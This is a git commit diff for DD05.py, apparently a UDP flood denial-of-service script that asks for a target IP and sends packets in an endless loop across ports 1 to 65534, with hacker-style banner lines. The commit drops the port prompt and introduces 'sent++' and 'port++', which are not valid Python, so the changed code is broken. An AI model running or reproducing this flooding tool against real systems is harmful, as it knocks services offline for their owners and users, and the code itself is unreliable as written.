fabf26774f60ed964b57c382165d7feb20bd25df
zoomer <51061101+calebrwalk5@users.noreply.github.com>
2021-10-28 08:19:53 -0400

    Update DD05.py

--- DD05.py
+++ DD05.py
@@ -12,7 +12,7 @@ day = now.day
 month = now.month
 year = now.year
 ip = 0
-port = 0
+port = 1
 sent = 0
  
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -22,14 +22,13 @@ print (R+"#FVCK 50C137Y")
 print (B+"#FR33D0M I5 4N I11U510N"+N)
 print
 ip = raw_input("[$] TARGET IP: ")
-port = input("[$] PORT: ")
 os.system("clear")
 time.sleep(2)
 print()
 while True:
 	sock.sendto(bytes, (ip,port))
-	sent = sent + 1
-	port = port + 1
 	print("Sent %s packet to %s through port: %s") % (sent,ip,port)
+	sent++
+	port++
 	if port == 65534: # Once it reaches the max, go back to the min
 		port = 1
